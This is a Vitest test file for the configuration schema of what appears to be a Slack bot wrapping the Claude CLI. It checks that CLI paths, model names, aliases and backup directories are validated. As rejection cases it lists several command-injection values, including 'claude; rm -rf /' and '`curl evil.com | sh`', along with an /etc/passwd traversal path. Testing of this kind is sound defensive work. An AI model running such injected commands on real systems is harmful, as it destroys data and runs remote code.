import { describe, it, expect } from 'vitest';
import { ConfigSchema } from '../../src/config/schema.js';

describe('ConfigSchema', () => {
  const validBaseConfig = {
    slack: {
      botToken: 'xoxb-test-token',
      appToken: 'xapp-test-token',
    },
    authorization: {
      userIds: ['U12345678'],
    },
    rateLimit: {
      max: 10,
      windowSeconds: 60,
    },
    server: {
      dockerSocket: '/var/run/docker.sock',
    },
    logging: {
      level: 'info',
    },
  };

  describe('claude.cliPath validation', () => {
    it('should accept valid CLI path: simple name', () => {
      const config = {
        ...validBaseConfig,
        claude: {
          cliPath: 'claude',
          cliModel: 'sonnet',
        },
      };

      const result = ConfigSchema.safeParse(config);
      expect(result.success).toBe(true);
    });

    it('should accept valid CLI path: absolute path', () => {
      const config = {
        ...validBaseConfig,
        claude: {
          cliPath: '/usr/local/bin/claude',
          cliModel: 'sonnet',
        },
      };

      const result = ConfigSchema.safeParse(config);
      expect(result.success).toBe(true);
    });

    it('should accept valid CLI path: with dots in filename', () => {
      const config = {
        ...validBaseConfig,
        claude: {
          cliPath: '/opt/claude/bin/claude.v2',
          cliModel: 'sonnet',
        },
      };

      const result = ConfigSchema.safeParse(config);
      expect(result.success).toBe(true);
    });

    it('should reject CLI path with shell metacharacters: semicolon', () => {
      const config = {
        ...validBaseConfig,
        claude: {
          cliPath: 'claude; rm -rf /',
          cliModel: 'sonnet',
        },
      };

      const result = ConfigSchema.safeParse(config);
      expect(result.success).toBe(false);
    });

    it('should reject CLI path with shell metacharacters: pipe', () => {
      const config = {
        ...validBaseConfig,
        claude: {
          cliPath: 'echo bad | sh',
          cliModel: 'sonnet',
        },
      };

      const result = ConfigSchema.safeParse(config);
      expect(result.success).toBe(false);
    });

    it('should reject CLI path with shell metacharacters: backticks', () => {
      const config = {
        ...validBaseConfig,
        claude: {
          cliPath: '`curl evil.com | sh`',
          cliModel: 'sonnet',
        },
      };

      const result = ConfigSchema.safeParse(config);
      expect(result.success).toBe(false);
    });

    it('should reject CLI path with parent directory references', () => {
      const config = {
        ...validBaseConfig,
        claude: {
          cliPath: '/usr/../../../etc/passwd',
          cliModel: 'sonnet',
        },
      };

      const result = ConfigSchema.safeParse(config);
      expect(result.success).toBe(false);
    });

    it('should reject CLI path with spaces', () => {
      const config = {
        ...validBaseConfig,
        claude: {
          cliPath: '/path with spaces/claude',
          cliModel: 'sonnet',
        },
      };

      const result = ConfigSchema.safeParse(config);
      expect(result.success).toBe(false);
    });
  });

  describe('claude.cliModel validation', () => {
    it('should accept valid model names', () => {
      const validModels = ['sonnet', 'opus', 'haiku', 'claude-3-sonnet', 'claude-sonnet-4-20250514'];

      for (const model of validModels) {
        const config = {
          ...validBaseConfig,
          claude: {
            cliPath: 'claude',
            cliModel: model,
          },
        };

        const result = ConfigSchema.safeParse(config);
        expect(result.success, `Should accept model: ${model}`).toBe(true);
      }
    });

    it('should reject model name with shell metacharacters', () => {
      const config = {
        ...validBaseConfig,
        claude: {
          cliPath: 'claude',
          cliModel: 'sonnet; rm -rf /',
        },
      };

      const result = ConfigSchema.safeParse(config);
      expect(result.success).toBe(false);
    });
  });

  describe('claude.contextOptions validation', () => {
    it('should accept valid context options', () => {
      const config = {
        ...validBaseConfig,
        claude: {
          cliPath: 'claude',
          cliModel: 'sonnet',
          contextOptions: [
            { alias: 'homelab', path: '/opt/homelab' },
            { alias: 'infra', path: '/opt/infrastructure' },
          ],
        },
      };

      const result = ConfigSchema.safeParse(config);
      expect(result.success).toBe(true);
      if (result.success) {
        expect(result.data.claude?.contextOptions).toHaveLength(2);
      }
    });

    it('should accept alias with underscores and hyphens', () => {
      const config = {
        ...validBaseConfig,
        claude: {
          cliPath: 'claude',
          cliModel: 'sonnet',
          contextOptions: [
            { alias: 'home_lab-01', path: '/opt/homelab' },
          ],
        },
      };

      const result = ConfigSchema.safeParse(config);
      expect(result.success).toBe(true);
    });

    it('should reject alias with spaces', () => {
      const config = {
        ...validBaseConfig,
        claude: {
          cliPath: 'claude',
          cliModel: 'sonnet',
          contextOptions: [
            { alias: 'home lab', path: '/opt/homelab' },
          ],
        },
      };

      const result = ConfigSchema.safeParse(config);
      expect(result.success).toBe(false);
    });

    it('should reject alias with colons', () => {
      const config = {
        ...validBaseConfig,
        claude: {
          cliPath: 'claude',
          cliModel: 'sonnet',
          contextOptions: [
            { alias: 'home:lab', path: '/opt/homelab' },
          ],
        },
      };

      const result = ConfigSchema.safeParse(config);
      expect(result.success).toBe(false);
    });

    it('should reject empty path', () => {
      const config = {
        ...validBaseConfig,
        claude: {
          cliPath: 'claude',
          cliModel: 'sonnet',
          contextOptions: [
            { alias: 'homelab', path: '' },
          ],
        },
      };

      const result = ConfigSchema.safeParse(config);
      expect(result.success).toBe(false);
    });

    it('should default to empty array when not provided', () => {
      const config = {
        ...validBaseConfig,
        claude: {
          cliPath: 'claude',
          cliModel: 'sonnet',
        },
      };

      const result = ConfigSchema.safeParse(config);
      expect(result.success).toBe(true);
      if (result.success) {
        expect(result.data.claude?.contextOptions).toEqual([]);
      }
    });
  });

  describe('server.backupDirs validation', () => {
    it('should accept valid backup directories', () => {
      const config = {
        ...validBaseConfig,
        server: {
          ...validBaseConfig.server,
          backupDirs: ['/opt/backups', '/mnt/nas/backups', '/var/backups'],
        },
      };

      const result = ConfigSchema.safeParse(config);
      expect(result.success).toBe(true);
      if (result.success) {
        expect(result.data.server.backupDirs).toHaveLength(3);
      }
    });

    it('should reject relative paths', () => {
      const config = {
        ...validBaseConfig,
        server: {
          ...validBaseConfig.server,
          backupDirs: ['backups', './backups', 'relative/path'],
        },
      };

      const result = ConfigSchema.safeParse(config);
      expect(result.success).toBe(false);
    });

    it('should reject paths with parent directory references', () => {
      const config = {
        ...validBaseConfig,
        server: {
          ...validBaseConfig.server,
          backupDirs: ['/opt/../etc/backups'],
        },
      };

      const result = ConfigSchema.safeParse(config);
      expect(result.success).toBe(false);
    });

    it('should reject /etc directory', () => {
      const config = {
        ...validBaseConfig,
        server: {
          ...validBaseConfig.server,
          backupDirs: ['/etc/backups'],
        },
      };

      const result = ConfigSchema.safeParse(config);
      expect(result.success).toBe(false);
    });

    it('should reject /root directory', () => {
      const config = {
        ...validBaseConfig,
        server: {
          ...validBaseConfig.server,
          backupDirs: ['/root/backups'],
        },
      };

      const result = ConfigSchema.safeParse(config);
      expect(result.success).toBe(false);
    });

    it('should reject /home directory', () => {
      const config = {
        ...validBaseConfig,
        server: {
          ...validBaseConfig.server,
          backupDirs: ['/home/user/backups'],
        },
      };

      const result = ConfigSchema.safeParse(config);
      expect(result.success).toBe(false);
    });

    it('should reject /usr directory', () => {
      const config = {
        ...validBaseConfig,
        server: {
          ...validBaseConfig.server,
          backupDirs: ['/usr/local/backups'],
        },
      };

      const result = ConfigSchema.safeParse(config);
      expect(result.success).toBe(false);
    });

    it('should handle trailing slashes and normalize', () => {
      const config = {
        ...validBaseConfig,
        server: {
          ...validBaseConfig.server,
          backupDirs: ['/opt/backups/'],
        },
      };

      const result = ConfigSchema.safeParse(config);
      expect(result.success).toBe(true);
    });

    it('should default to empty array when not provided', () => {
      const result = ConfigSchema.safeParse(validBaseConfig);
      expect(result.success).toBe(true);
      if (result.success) {
        expect(result.data.server.backupDirs).toEqual([]);
      }
    });
  });

});
